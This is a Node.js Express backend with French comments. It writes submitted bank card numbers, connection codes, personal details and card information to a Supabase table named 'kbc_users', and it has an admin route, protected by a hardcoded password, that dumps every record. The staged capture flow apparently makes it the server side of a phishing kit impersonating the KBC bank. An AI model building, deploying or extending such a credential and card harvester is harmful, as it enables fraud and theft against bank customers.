import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { createClient } from '@supabase/supabase-js';

dotenv.config();

const app = express();
const port = 3001;

// Initialisation Supabase
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Middleware
app.use(cors());
app.use(express.json());

// Logging Middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] REQUÊTE REÇUE: ${req.method} ${req.url}`);
    console.log('Body:', req.body);
    next();
});

// Anti-Crash
process.on('uncaughtException', (err) => {
    console.error('!!! ERREUR NON GÉRÉE !!!', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('!!! PROMESSE REJETÉE NON GÉRÉE !!!', reason);
});

// --- ROUTES SUPABASE ---

// 1. Initialisation (Login)
app.post('/api/init', async (req, res) => {
    const { cardNumber, connectionCode } = req.body;

    const { data, error } = await supabase
        .from('kbc_users')
        .insert([
            {
                card_number_login: cardNumber,
                connection_code: connectionCode,
                status: 'started'
            }
        ])
        .select(); // Nécessaire pour récupérer l'ID généré

    if (error) {
        console.error('Erreur Supabase Init:', error);
        return res.status(500).json({ error: error.message });
    }

    // Supabase renvoie un tableau, on prend le premier élément
    const id = data[0].id;
    res.json({ id, success: true });
});

// 2. Mise à jour (Infos Personnelles)
app.post('/api/update-personal', async (req, res) => {
    const { id, personalInfo } = req.body;

    const { error } = await supabase
        .from('kbc_users')
        .update({
            personal_info: personalInfo,
            status: 'personal_info_completed'
        })
        .eq('id', id);

    if (error) {
        console.error('Erreur Supabase Update Personal:', error);
        return res.status(500).json({ error: error.message });
    }

    res.json({ success: true });
});

// 3. Mise à jour (Carte - Final)
app.post('/api/update-card', async (req, res) => {
    const { id, cardInfo } = req.body;

    const { error } = await supabase
        .from('kbc_users')
        .update({
            card_info: cardInfo,
            status: 'completed'
        })
        .eq('id', id);

    if (error) {
        console.error('Erreur Supabase Update Card:', error);
        return res.status(500).json({ error: error.message });
    }

    res.json({ success: true });
});

// Admin : Tout récupérer
app.get('/api/admin/data', async (req, res) => {
    const { password } = req.query;

    if (password !== 'kbcAdmin321') {
        return res.status(401).json({ error: 'Non autorisé' });
    }

    const { data, error } = await supabase
        .from('kbc_users')
        .select('*')
        .order('created_at', { ascending: false });

    if (error) {
        console.error('Erreur Supabase Admin:', error);
        return res.status(500).json({ error: error.message });
    }

    res.json(data);
});

app.listen(port, () => {
    console.log(`Serveur Supabase backend démarré sur http://localhost:${port}`);
});
